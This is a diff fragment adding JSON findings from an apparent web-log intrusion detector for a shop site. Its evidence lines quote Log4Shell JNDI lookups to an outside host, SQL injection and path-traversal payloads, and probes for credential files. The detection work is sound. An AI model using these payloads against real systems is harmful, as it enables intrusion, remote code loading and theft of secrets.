+        "198.51.100.251 - - [01/Nov/2026:01:59:53 +0000] \"GET /docs/search?q=%3Cscript+src%3D%22app.js%22%3E HTTP/1.1\" 200 3061 \"https://shop.example.com/docs/\" \"Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0\""
+      ],
+      "detail": "1 matching request(s); patterns: script-tag. answered 2xx, but /docs/search answers 2xx to ordinary requests (18 baseline, size ~4465 bytes), so not treated as success."
+    },
+    {
+      "rule_id": "SIG-SQLI",
+      "title": "SQL injection pattern",
+      "severity": "high",
+      "client_ip": "198.51.100.251",
+      "first_seen": "2026-11-01T02:01:10+00:00",
+      "last_seen": "2026-11-01T02:02:47+00:00",
+      "event_count": 2,
+      "technique": "T1190",
+      "evidence": [
+        "198.51.100.251 - - [01/Nov/2026:02:01:10 +0000] \"GET /docs/search?q=%27+OR+1%3D1+explained HTTP/1.1\" 200 3669 \"https://shop.example.com/docs/\" \"Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0\"",
+        "198.51.100.251 - - [01/Nov/2026:02:02:47 +0000] \"GET /docs/search?q=UNION+SELECT+explained HTTP/1.1\" 200 5614 \"https://shop.example.com/docs/\" \"Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0\""
+      ],
+      "detail": "2 matching request(s); patterns: tautology, numeric-compare, quote-or-cmp, union-select. answered 2xx, but /docs/search answers 2xx to ordinary requests (18 baseline, size ~4465 bytes), so not treated as success."
+    },
+    {
+      "rule_id": "SIG-LOG4SHELL",
+      "title": "Log4Shell JNDI injection (CVE-2021-44228)",
+      "severity": "critical",
+      "client_ip": "203.0.113.15",
+      "first_seen": "2026-11-01T02:02:12+00:00",
+      "last_seen": "2026-11-01T02:02:19+00:00",
+      "event_count": 3,
+      "technique": "T1190",
+      "evidence": [
+        "203.0.113.15 - - [01/Nov/2026:02:02:12 +0000] \"GET / HTTP/1.1\" 200 14531 \"-\" \"${jndi:ldap://203.0.113.99/a}\"",
+        "203.0.113.15 - - [01/Nov/2026:02:02:15 +0000] \"GET /login HTTP/1.1\" 200 262 \"${jndi:ldap://203.0.113.99/b}\" \"${jndi:ldap://203.0.113.99/a}\"",
+        "203.0.113.15 - - [01/Nov/2026:02:02:19 +0000] \"GET /search?q=%24%7Bjndi%3Aldap%3A%2F%2F203.0.113.99%2Fc%7D HTTP/1.1\" 200 10117 \"-\" \"curl/8.5.0\""
+      ],
+      "detail": "3 matching request(s); patterns: jndi-lookup. 1 request(s) were answered with HTTP 2xx, so the attempt may have succeeded; severity raised to critical. answered 2xx, but / answers 2xx to ordinary requests (204 baseline, size ~12682 bytes), so not treated as success."
+    },
+    {
+      "rule_id": "BEH-LOW-AND-SLOW",
+      "title": "Low-and-slow path enumeration",
+      "severity": "medium",
+      "client_ip": "203.0.113.11",
+      "first_seen": "2026-11-01T02:39:35+00:00",
+      "last_seen": "2026-11-01T02:48:19+00:00",
+      "event_count": 84,
+      "technique": "T1595.003",
+      "evidence": [
+        "203.0.113.11 - - [01/Nov/2026:02:42:44 +0000] \"GET /test/images2.php HTTP/1.1\" 404 151 \"-\" \"Mozilla/5.0 (compatible; Nikto/2.5.0)\"",
+        "203.0.113.11 - - [01/Nov/2026:02:42:48 +0000] \"GET /backup/api-v1.php HTTP/1.1\" 404 193 \"-\" \"Mozilla/5.0 (compatible; Nikto/2.5.0)\"",
+        "203.0.113.11 - - [01/Nov/2026:02:42:54 +0000] \"GET /web/db.php HTTP/1.1\" 404 583 \"-\" \"Mozilla/5.0 (compatible; Nikto/2.5.0)\"",
+        "203.0.113.11 - - [01/Nov/2026:02:43:04 +0000] \"GET /web/cms.php HTTP/1.1\" 404 479 \"-\" \"Mozilla/5.0 (compatible; Nikto/2.5.0)\"",
+        "203.0.113.11 - - [01/Nov/2026:02:43:15 +0000] \"GET /data/uploads.php HTTP/1.1\" 404 309 \"-\" \"Mozilla/5.0 (compatible; Nikto/2.5.0)\""
+      ],
+      "detail": "40 miss responses (401/403/404/410) of 40 requests (100%) across 40 distinct paths within 21600s; patient forced browsing that stays under the short-window rules."
+    },
+    {
+      "rule_id": "SIG-SENSITIVE-PATH",
+      "title": "Probe for sensitive file or path",
+      "severity": "medium",
+      "client_ip": "203.0.113.11",
+      "first_seen": "2026-11-01T02:39:35+00:00",
+      "last_seen": "2026-11-01T02:40:10+00:00",
+      "event_count": 12,
+      "technique": "T1595.003",
+      "evidence": [
+        "203.0.113.11 - - [01/Nov/2026:02:39:35 +0000] \"GET /config.php.old HTTP/1.1\" 404 187 \"-\" \"Mozilla/5.0 (compatible; Nikto/2.5.0)\"",
+        "203.0.113.11 - - [01/Nov/2026:02:39:39 +0000] \"GET /phpinfo.php HTTP/1.1\" 404 501 \"-\" \"Mozilla/5.0 (compatible; Nikto/2.5.0)\"",
+        "203.0.113.11 - - [01/Nov/2026:02:39:41 +0000] \"GET /.env HTTP/1.1\" 404 306 \"-\" \"Mozilla/5.0 (compatible; Nikto/2.5.0)\"",
+        "203.0.113.11 - - [01/Nov/2026:02:39:45 +0000] \"GET /.htpasswd HTTP/1.1\" 404 204 \"-\" \"Mozilla/5.0 (compatible; Nikto/2.5.0)\"",
+        "203.0.113.11 - - [01/Nov/2026:02:39:49 +0000] \"GET /wp-config.php.bak HTTP/1.1\" 404 450 \"-\" \"Mozilla/5.0 (compatible; Nikto/2.5.0)\""
+      ],
+      "detail": "12 matching request(s); patterns: backup-file, phpinfo, dotenv, cloud-creds, wp-config, db-admin, git-dir, cgi-bin, server-status."
+    },
+    {
+      "rule_id": "SIG-UA-SCANNER",
+      "title": "Known scanner user agent",
+      "severity": "medium",
+      "client_ip": "203.0.113.11",
+      "first_seen": "2026-11-01T02:39:35+00:00",
+      "last_seen": "2026-11-01T02:48:19+00:00",
+      "event_count": 84,
+      "technique": "T1595.002",
+      "evidence": [
+        "203.0.113.11 - - [01/Nov/2026:02:39:35 +0000] \"GET /config.php.old HTTP/1.1\" 404 187 \"-\" \"Mozilla/5.0 (compatible; Nikto/2.5.0)\"",
+        "203.0.113.11 - - [01/Nov/2026:02:39:39 +0000] \"GET /phpinfo.php HTTP/1.1\" 404 501 \"-\" \"Mozilla/5.0 (compatible; Nikto/2.5.0)\"",
+        "203.0.113.11 - - [01/Nov/2026:02:39:41 +0000] \"GET /.env HTTP/1.1\" 404 306 \"-\" \"Mozilla/5.0 (compatible; Nikto/2.5.0)\"",
+        "203.0.113.11 - - [01/Nov/2026:02:39:45 +0000] \"GET /.htpasswd HTTP/1.1\" 404 204 \"-\" \"Mozilla/5.0 (compatible; Nikto/2.5.0)\"",
+        "203.0.113.11 - - [01/Nov/2026:02:39:49 +0000] \"GET /wp-config.php.bak HTTP/1.1\" 404 450 \"-\" \"Mozilla/5.0 (compatible; Nikto/2.5.0)\""
+      ],
+      "detail": "84 matching request(s); patterns: scanner-ua."
+    },
+    {
+      "rule_id": "SIG-SQLI",
+      "title": "SQL injection pattern",
+      "severity": "critical",
+      "client_ip": "203.0.113.14",
+      "first_seen": "2026-11-01T02:55:51+00:00",
+      "last_seen": "2026-11-01T02:57:55+00:00",
+      "event_count": 40,
+      "technique": "T1190",
+      "evidence": [
+        "203.0.113.14 - - [01/Nov/2026:02:55:51 +0000] \"GET /products?id=1'+OR+'1'='1 HTTP/1.1\" 500 225 \"-\" \"sqlmap/1.8#stable (https://sqlmap.org)\"",
+        "203.0.113.14 - - [01/Nov/2026:02:55:54 +0000] \"GET /products?id=1+UNION+SELECT+NULL-- HTTP/1.1\" 200 6006 \"-\" \"sqlmap/1.8#stable (https://sqlmap.org)\"",
+        "203.0.113.14 - - [01/Nov/2026:02:55:59 +0000] \"GET /products?id=1+UNION+SELECT+NULL,NULL,NULL-- HTTP/1.1\" 200 716 \"-\" \"sqlmap/1.8#stable (https://sqlmap.org)\"",
+        "203.0.113.14 - - [01/Nov/2026:02:56:04 +0000] \"GET /products?id=1;+SELECT+SLEEP(5)-- HTTP/1.1\" 200 14618 \"-\" \"sqlmap/1.8#stable (https://sqlmap.org)\"",
+        "203.0.113.14 - - [01/Nov/2026:02:56:05 +0000] \"GET /products?id=1'+AND+SLEEP(5)--+- HTTP/1.1\" 500 382 \"-\" \"sqlmap/1.8#stable (https://sqlmap.org)\""
+      ],
+      "detail": "40 matching request(s); patterns: tautology, quote-or-cmp, union-select, select-fn, quote-comment, time-based, numeric-compare, sql-variable. 12 request(s) were answered with HTTP 2xx, so the attempt may have succeeded; severity raised to critical."
+    },
+    {
+      "rule_id": "SIG-UA-SCANNER",
+      "title": "Known scanner user agent",
+      "severity": "medium",
+      "client_ip": "203.0.113.14",
+      "first_seen": "2026-11-01T02:55:51+00:00",
+      "last_seen": "2026-11-01T02:57:55+00:00",
+      "event_count": 40,
+      "technique": "T1595.002",
+      "evidence": [
+        "203.0.113.14 - - [01/Nov/2026:02:55:51 +0000] \"GET /products?id=1'+OR+'1'='1 HTTP/1.1\" 500 225 \"-\" \"sqlmap/1.8#stable (https://sqlmap.org)\"",
+        "203.0.113.14 - - [01/Nov/2026:02:55:54 +0000] \"GET /products?id=1+UNION+SELECT+NULL-- HTTP/1.1\" 200 6006 \"-\" \"sqlmap/1.8#stable (https://sqlmap.org)\"",
+        "203.0.113.14 - - [01/Nov/2026:02:55:59 +0000] \"GET /products?id=1+UNION+SELECT+NULL,NULL,NULL-- HTTP/1.1\" 200 716 \"-\" \"sqlmap/1.8#stable (https://sqlmap.org)\"",
+        "203.0.113.14 - - [01/Nov/2026:02:56:04 +0000] \"GET /products?id=1;+SELECT+SLEEP(5)-- HTTP/1.1\" 200 14618 \"-\" \"sqlmap/1.8#stable (https://sqlmap.org)\"",
+        "203.0.113.14 - - [01/Nov/2026:02:56:05 +0000] \"GET /products?id=1'+AND+SLEEP(5)--+- HTTP/1.1\" 500 382 \"-\" \"sqlmap/1.8#stable (https://sqlmap.org)\""
+      ],
+      "detail": "40 matching request(s); patterns: scanner-ua."
+    },
+    {
+      "rule_id": "BEH-404-BURST",
+      "title": "Burst of 404/403/410 responses (path enumeration)",
+      "severity": "medium",
+      "client_ip": "203.0.113.12",
+      "first_seen": "2026-11-01T03:34:33+00:00",
+      "last_seen": "2026-11-01T03:35:52+00:00",
+      "event_count": 80,
+      "technique": "T1595.003",
+      "evidence": [
+        "203.0.113.12 - - [01/Nov/2026:03:34:46 +0000] \"GET /staging HTTP/1.1\" 404 0 \"-\" \"gobuster/3.6\"",
+        "203.0.113.12 - - [01/Nov/2026:03:34:47 +0000] \"GET /uploads HTTP/1.1\" 404 0 \"-\" \"gobuster/3.6\"",
+        "203.0.113.12 - - [01/Nov/2026:03:34:47 +0000] \"GET /backup HTTP/1.1\" 404 0 \"-\" \"gobuster/3.6\"",
+        "203.0.113.12 - - [01/Nov/2026:03:34:49 +0000] \"GET /tmp HTTP/1.1\" 404 0 \"-\" \"gobuster/3.6\"",
+        "203.0.113.12 - - [01/Nov/2026:03:34:51 +0000] \"GET /test HTTP/1.1\" 404 0 \"-\" \"gobuster/3.6\""
+      ],
+      "detail": "20 miss responses (404/403/410) within 60s (threshold 20); consistent with directory guessing."
+    },
+    {
+      "rule_id": "BEH-LOW-AND-SLOW",
+      "title": "Low-and-slow path enumeration",
+      "severity": "medium",
+      "client_ip": "203.0.113.12",
+      "first_seen": "2026-11-01T03:34:33+00:00",
+      "last_seen": "2026-11-01T03:35:52+00:00",
+      "event_count": 80,
+      "technique": "T1595.003",
+      "evidence": [
+        "203.0.113.12 - - [01/Nov/2026:03:35:08 +0000] \"GET /files2 HTTP/1.1\" 404 0 \"-\" \"gobuster/3.6\"",
+        "203.0.113.12 - - [01/Nov/2026:03:35:09 +0000] \"GET /logs2 HTTP/1.1\" 404 0 \"-\" \"gobuster/3.6\"",
+        "203.0.113.12 - - [01/Nov/2026:03:35:09 +0000] \"GET /data2 HTTP/1.1\" 404 0 \"-\" \"gobuster/3.6\"",
+        "203.0.113.12 - - [01/Nov/2026:03:35:10 +0000] \"GET /web2 HTTP/1.1\" 404 0 \"-\" \"gobuster/3.6\"",
+        "203.0.113.12 - - [01/Nov/2026:03:35:10 +0000] \"GET /site2 HTTP/1.1\" 404 0 \"-\" \"gobuster/3.6\""
+      ],
+      "detail": "40 miss responses (401/403/404/410) of 40 requests (100%) across 40 distinct paths within 21600s; patient forced browsing that stays under the short-window rules."
+    },
+    {
+      "rule_id": "SIG-UA-SCANNER",
+      "title": "Known scanner user agent",
+      "severity": "medium",
+      "client_ip": "203.0.113.12",
+      "first_seen": "2026-11-01T03:34:33+00:00",
+      "last_seen": "2026-11-01T03:35:52+00:00",
+      "event_count": 80,
+      "technique": "T1595.002",
+      "evidence": [
+        "203.0.113.12 - - [01/Nov/2026:03:34:33 +0000] \"GET /portal HTTP/1.1\" 404 0 \"-\" \"gobuster/3.6\"",
+        "203.0.113.12 - - [01/Nov/2026:03:34:35 +0000] \"GET /images2 HTTP/1.1\" 404 0 \"-\" \"gobuster/3.6\"",
+        "203.0.113.12 - - [01/Nov/2026:03:34:37 +0000] \"GET /db HTTP/1.1\" 404 0 \"-\" \"gobuster/3.6\"",
+        "203.0.113.12 - - [01/Nov/2026:03:34:38 +0000] \"GET /web HTTP/1.1\" 404 0 \"-\" \"gobuster/3.6\"",
+        "203.0.113.12 - - [01/Nov/2026:03:34:38 +0000] \"GET /secret HTTP/1.1\" 404 0 \"-\" \"gobuster/3.6\""
+      ],
+      "detail": "80 matching request(s); patterns: scanner-ua."
+    },
+    {
+      "rule_id": "BEH-BRUTE-FORCE",
+      "title": "Login brute force",
+      "severity": "high",
+      "client_ip": "203.0.113.13",
+      "first_seen": "2026-11-01T03:35:51+00:00",
+      "last_seen": "2026-11-01T03:39:34+00:00",
+      "event_count": 40,
+      "technique": "T1110",
+      "evidence": [
+        "203.0.113.13 - - [01/Nov/2026:03:36:22 +0000] \"POST /login HTTP/1.1\" 401 512 \"https://shop.example.com/login\" \"Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0\"",
+        "203.0.113.13 - - [01/Nov/2026:03:36:26 +0000] \"POST /login HTTP/1.1\" 401 512 \"https://shop.example.com/login\" \"Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0\"",
+        "203.0.113.13 - - [01/Nov/2026:03:36:34 +0000] \"POST /login HTTP/1.1\" 401 512 \"https://shop.example.com/login\" \"Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0\"",
+        "203.0.113.13 - - [01/Nov/2026:03:36:40 +0000] \"POST /login HTTP/1.1\" 401 512 \"https://shop.example.com/login\" \"Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0\"",
+        "203.0.113.13 - - [01/Nov/2026:03:36:48 +0000] \"POST /login HTTP/1.1\" 401 512 \"https://shop.example.com/login\" \"Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0\""
+      ],
+      "detail": "10 login POSTs within 300s (threshold 10); 10 explicit 401/403 failures."
+    },
+    {
+      "rule_id": "BEH-BRUTE-SUCCESS",
+      "title": "Successful login after brute force",
+      "severity": "critical",
+      "client_ip": "203.0.113.13",
+      "first_seen": "2026-11-01T03:35:51+00:00",
+      "last_seen": "2026-11-01T03:39:41+00:00",
+      "event_count": 41,
+      "technique": "T1110",
+      "evidence": [
+        "203.0.113.13 - - [01/Nov/2026:03:39:17 +0000] \"POST /login HTTP/1.1\" 401 512 \"https://shop.example.com/login\" \"Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0\"",
+        "203.0.113.13 - - [01/Nov/2026:03:39:24 +0000] \"POST /login HTTP/1.1\" 401 512 \"https://shop.example.com/login\" \"Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0\"",
+        "203.0.113.13 - - [01/Nov/2026:03:39:31 +0000] \"POST /login HTTP/1.1\" 401 512 \"https://shop.example.com/login\" \"Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0\"",
+        "203.0.113.13 - - [01/Nov/2026:03:39:34 +0000] \"POST /login HTTP/1.1\" 401 512 \"https://shop.example.com/login\" \"Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0\"",
+        "203.0.113.13 - - [01/Nov/2026:03:39:41 +0000] \"POST /login HTTP/1.1\" 302 0 \"https://shop.example.com/login\" \"Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0\""
+      ],
+      "detail": "Login succeeded (HTTP 302) after 40 failed attempts (401/403); credentials may be compromised."
+    },
+    {
+      "rule_id": "SIG-SQLI",
+      "title": "SQL injection pattern",
+      "severity": "critical",
+      "client_ip": "203.0.113.24",
+      "first_seen": "2026-11-01T04:38:13+00:00",
+      "last_seen": "2026-11-01T04:40:22+00:00",
+      "event_count": 5,
+      "technique": "T1190",
+      "evidence": [
+        "203.0.113.24 - - [01/Nov/2026:04:38:13 +0000] \"GET /products?id=1%20AND%201=CONVERT(int,@@version) HTTP/1.1\" 200 14305 \"https://shop.example.com/\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\"",
+        "203.0.113.24 - - [01/Nov/2026:04:38:50 +0000] \"GET /products?sort=name%20ORDER%20BY%2010-- HTTP/1.1\" 200 20624 \"https://shop.example.com/\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\"",
+        "203.0.113.24 - - [01/Nov/2026:04:39:28 +0000] \"GET /products?id=1+AND+1=2-- HTTP/1.1\" 200 23299 \"https://shop.example.com/\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\"",
+        "203.0.113.24 - - [01/Nov/2026:04:39:54 +0000] \"GET /products?id=1%20AND%201=1 HTTP/1.1\" 200 5043 \"https://shop.example.com/\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\"",
+        "203.0.113.24 - - [01/Nov/2026:04:40:22 +0000] \"GET /products?id=1%27%20AND%20%271%27=%272 HTTP/1.1\" 200 8206 \"https://shop.example.com/\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\""
+      ],
+      "detail": "5 matching request(s); patterns: sql-variable, order-by, numeric-compare, tautology, quote-or-cmp. 5 request(s) were answered with HTTP 2xx, so the attempt may have succeeded; severity raised to critical."
+    },
+    {
+      "rule_id": "SIG-TRAVERSAL",
+      "title": "Path traversal pattern",
+      "severity": "high",
+      "client_ip": "203.0.113.25",
+      "first_seen": "2026-11-01T04:44:35+00:00",
+      "last_seen": "2026-11-01T04:45:45+00:00",
+      "event_count": 4,
+      "technique": "T1190",
+      "evidence": [
+        "203.0.113.25 - - [01/Nov/2026:04:44:35 +0000] \"GET /download?file=%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252fetc/passwd HTTP/1.1\" 404 234 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\"",
+        "203.0.113.25 - - [01/Nov/2026:04:45:05 +0000] \"GET /download?file=%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252fetc/passwd HTTP/1.1\" 403 271 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\"",
+        "203.0.113.25 - - [01/Nov/2026:04:45:33 +0000] \"GET /download?file=%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252fetc/passwd HTTP/1.1\" 403 578 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\"",
+        "203.0.113.25 - - [01/Nov/2026:04:45:45 +0000] \"GET /download?file=%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252fetc/passwd HTTP/1.1\" 404 510 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\""
+      ],
+      "detail": "4 matching request(s); patterns: repeated-dotdot, dotdot-target, etc-passwd."
+    }
+  ]
+}
